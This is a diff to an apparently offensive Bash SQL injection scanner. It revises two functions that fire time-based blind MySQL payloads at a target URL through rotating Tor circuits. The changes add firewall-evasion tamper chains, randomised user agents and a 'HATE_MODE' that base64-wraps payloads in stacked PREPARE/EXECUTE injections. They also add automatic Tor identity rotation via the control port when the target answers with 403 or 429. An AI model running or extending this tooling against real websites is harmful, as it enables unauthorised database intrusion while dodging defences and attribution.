@@ -129,53 +129,81 @@ dork() {
         echo -e "[i] Proceeding with default input."
         return 2
     fi
-}
-
 vector_sqli_agressor_left() {
     while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
         [[ -z "$default_path" ]] && continue
 
         local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-        if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port --fail"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
-        local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
-local defiance_tamper_path=""
-if [ "$HATE_MODE" = "true" ]; then
-b64_path=$(base64_engine "$default_path")
-defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_path}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+        local proxy_flag=""
+        if [ -n "$custom_proxy" ]; then
+            proxy_flag="-x $random_port --fail"
         else
-        local t1=$(between_engine "$default_path")
-        local t2=$(charencode_engine "$t1")
-        local t3=$(apostrophenullencode_engine "$t2")
-        local t4=$(randomcase_engine "$t3")
-        local t5=$(space2comment_engine "$t4")
-        local t6=$(appendnullbyte_engine "$t5")
-        local t7=$(xor_engine "$t6")
-        defiance_tamper_path=$(weirdcomment_engine "$t7")
-fi
+            proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
+        fi
+
+        local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
+        local random_ua="$base_ua"
+        if [ "$HATE_MODE" = "true" ]; then
+            local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
+        fi
+
+        local defiance_tamper_path=""
         local final_query=""
-        if [[ "$defiance_tamper_path" == *"="* ]]; then
-            local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
-            local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
-            final_query="${param_name}=999&${param_name}=${param_val}${query_payload}"
+
+        if [ "$HATE_MODE" = "true" ]; then
+            local b64_payload=$(base64_engine "$query_payload")
+            defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+            final_query="${default_path}${defiance_tamper_path}"
         else
-            final_query="${defiance_tamper_path}${query_payload}"
+            local t1=$(between_engine "$default_path")
+            local t2=$(charencode_engine "$t1")
+            local t3=$(apostrophenullencode_engine "$t2")
+            local t4=$(randomcase_engine "$t3")
+            local t5=$(space2comment_engine "$t4")
+            local t6=$(appendnullbyte_engine "$t5")
+            local t7=$(xor_engine "$t6")
+            defiance_tamper_path=$(weirdcomment_engine "$t7")
+
+            if [[ "$WORDLIST_MYSQL" == *"nonphp"* ]]; then
+                final_query="${defiance_tamper_path}${query_payload}"
+            else
+                if [[ "$defiance_tamper_path" == *"="* ]]; then
+                    local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
+                    local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
+                    final_query="${param_name}=999&${param_name}=${param_val}${query_payload}"
+                else
+                    final_query="${defiance_tamper_path}${query_payload}"
+                fi
+            fi
         fi
 
         local waf_trick=$(braindamage)
         echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[38;5;236m$target_url$final_query\e[0m"
 
-        local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
+        local curl_output=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "$target_url$final_query")
+        local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
+        local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
-        if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
-            echo -e "\e[0;31m[!+!]\e[0m Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
-            echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
+        if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
+            echo -e "    \e[0;33m[!]\e[0m Port $random_port Shadowbanned (HTTP $http_status). Rotating TOR IP Circuit..."
+            (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
+            sleep 1
         fi
+
+        if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
+            if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
+                echo -e "\e[0;31m[!+!]\e[0m Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
+                echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
+            fi
+        fi
+
         if [ "$HATE_MODE" = "true" ]; then
-        sleep $((RANDOM % 6 + 4))
+            sleep $((RANDOM % 6 + 4))
         else
-        sleep 5
+            sleep 5
         fi
-    done < "$WORDLIST_MYSQL"
+    done < <(shuf "$WORDLIST_MYSQL")
 }
 
 vector_sqli_agressor_right() {
@@ -183,53 +211,76 @@ vector_sqli_agressor_right() {
         [[ -z "$default_path" ]] && continue
 
         local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-        if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port --fail"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
-        local base_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
-        local random_ua=""
-if [ "$HATE_MODE" = "true" ]; then
+        local proxy_flag=""
+        if [ -n "$custom_proxy" ]; then
+            proxy_flag="-x $random_port --fail"
+        else
+            proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
+        fi
+
+        local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
+        local random_ua="$base_ua"
+        if [ "$HATE_MODE" = "true" ]; then
             local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
             random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
-        else
-            random_ua="$base_ua"
         fi
-local defiance_tamper_path=""
-if [ "$HATE_MODE" = "true" ]; then
-            b64_path=$(base64_engine "$default_path")
-defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_path}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
-        else
-        local t1=$(between_engine "$default_path")
-        local t2=$(charencode_engine "$t1")
-        local t3=$(apostrophenullencode_engine "$t2")
-        local t4=$(randomcase_engine "$t3")
-        local t5=$(space2comment_engine "$t4")
-        local t6=$(appendnullbyte_engine "$t5")
-        local t7=$(xor_engine "$t6")
-        defiance_tamper_path=$(weirdcomment_engine "$t7")
-fi
+
+        local defiance_tamper_path=""
         local final_query=""
-        if [[ "$defiance_tamper_path" == *"="* ]]; then
-            local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
-            local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
-            final_query="${param_name}=999&${param_name}=${param_val}${query_payload}"
+
+        if [ "$HATE_MODE" = "true" ]; then
+            local b64_payload=$(base64_engine "$query_payload")
+            defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+            final_query="${default_path}${defiance_tamper_path}"
         else
-            final_query="${defiance_tamper_path}${query_payload}"
+            local t1=$(between_engine "$default_path")
+            local t2=$(charencode_engine "$t1")
+            local t3=$(apostrophenullencode_engine "$t2")
+            local t4=$(randomcase_engine "$t3")
+            local t5=$(space2comment_engine "$t4")
+            local t6=$(appendnullbyte_engine "$t5")
+            local t7=$(xor_engine "$t6")
+            defiance_tamper_path=$(weirdcomment_engine "$t7")
+
+            if [[ "$WORDLIST_MYSQL" == *"nonphp"* ]]; then
+                final_query="${defiance_tamper_path}${query_payload}"
+            else
+                if [[ "$defiance_tamper_path" == *"="* ]]; then
+                    local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
+                    local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
+                    final_query="${param_name}=999&${param_name}=${param_val}${query_payload}"
+                else
+                    final_query="${defiance_tamper_path}${query_payload}"
+                fi
+            fi
         fi
 
         local waf_trick=$(braindamage)
         echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m$target_url$final_query\e[0m"
 
-local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
+        local curl_output=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "$target_url$final_query")
+        local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
+        local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
-if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
-echo -e "\e[0;31m[!+!]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
-echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
-fi
-if [ "$HATE_MODE" = "true" ]; then
-sleep $((RANDOM % 6 + 4))
-else
-sleep 5
-fi
-done < "$WORDLIST_MYSQL"
+        if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
+            echo -e "    \e[0;33m[!]\e[0m Port $random_port Shadowbanned (HTTP $http_status). Rotating TOR IP Circuit..."
+            (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
+            sleep 1
+        fi
+
+        if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
+            if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
+                echo -e "\e[0;31m[!+!]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
+                echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
+            fi
+        fi
+
+        if [ "$HATE_MODE" = "true" ]; then
+            sleep $((RANDOM % 6 + 4))
+        else
+            sleep 5
+        fi
+    done < <(shuf "$WORDLIST_MYSQL")
 }
              
 clear
